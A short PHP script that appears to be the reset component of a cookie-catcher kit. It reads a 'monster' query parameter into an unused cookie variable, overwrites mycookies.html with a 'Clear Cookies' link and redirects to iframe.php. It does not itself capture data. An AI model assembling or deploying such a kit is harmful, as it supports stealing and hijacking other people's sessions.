<?php
$cookie=$_GET['monster'];
$fi=fopen('mycookies.html','w+');
fwrite($fi, "<div id='store'><a href='clear.php'>Clear Cookies</a></div>");
header("Location: iframe.php");
?>